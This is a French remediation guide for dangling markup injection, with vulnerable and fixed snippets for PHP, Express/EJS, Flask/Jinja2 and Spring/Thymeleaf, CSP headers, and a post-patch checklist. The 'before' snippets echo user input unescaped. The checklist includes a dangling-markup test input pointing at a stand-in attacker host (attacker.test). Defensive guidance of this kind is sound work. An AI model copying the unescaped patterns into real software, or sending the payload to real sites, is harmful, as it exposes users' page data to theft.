# Remédiation — Dangling Markup Injection

## Principe
Encoder systématiquement toute donnée utilisateur insérée dans le HTML (attributs et texte), quel que soit le contexte de balise, plutôt que de filtrer uniquement `<script>`. Utiliser un moteur de template à échappement automatique et compléter par une CSP restrictive (`img-src`, `form-action`, `base-uri`) pour limiter les destinations d'exfiltration.

## PHP
```php
// Avant — vulnérable : entrée utilisateur insérée sans encodage
echo '<div class="comment">' . $_POST['comment'] . '</div>';

// Après — sécurisé : encodage HTML systématique + CSP
header("Content-Security-Policy: default-src 'self'; img-src 'self'; form-action 'self'; base-uri 'self'");
echo '<div class="comment">' . htmlspecialchars($_POST['comment'], ENT_QUOTES, 'UTF-8') . '</div>';
```

## Node.js (Express + EJS)
```js
// Avant — vulnérable : sortie non échappée dans le template
// template.ejs : <div><%- comment %></div>

// Après — sécurisé : échappement automatique par défaut + CSP
// template.ejs : <div><%= comment %></div>
app.use((req, res, next) => {
  res.set('Content-Security-Policy',
    "default-src 'self'; img-src 'self'; form-action 'self'; base-uri 'self'");
  next();
});
```

## Python (Flask / Jinja2)
```python
# Avant — vulnérable : | safe désactive l'échappement automatique
return render_template_string("<div>{{ comment | safe }}</div>", comment=comment)

# Après — sécurisé : échappement automatique conservé + CSP
@app.after_request
def add_csp(response):
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; img-src 'self'; form-action 'self'; base-uri 'self'"
    )
    return response

return render_template_string("<div>{{ comment }}</div>", comment=comment)
```

## Java (Spring, Thymeleaf)
```java
// Avant — vulnérable : th:utext insère du HTML brut non échappé
// <div th:utext="${comment}"></div>

// Après — sécurisé : th:text échappe automatiquement + CSP
// <div th:text="${comment}"></div>
response.setHeader("Content-Security-Policy",
    "default-src 'self'; img-src 'self'; form-action 'self'; base-uri 'self'");
```

## Checklist de vérification post-patch
- [ ] Toute donnée utilisateur insérée dans le HTML passe par l'échappement automatique du moteur de template (pas de `| safe`, `-%>`, `th:utext`, etc.).
- [ ] Aucune liste noire de balises n'est utilisée seule comme protection contre l'injection HTML.
- [ ] Une CSP incluant `img-src`, `form-action` et `base-uri` restreints est présente sur les réponses concernées.
- [ ] Test : une entrée contenant `<img src="https://attacker.test/?` ne provoque plus de requête sortante non voulue au chargement de la page.
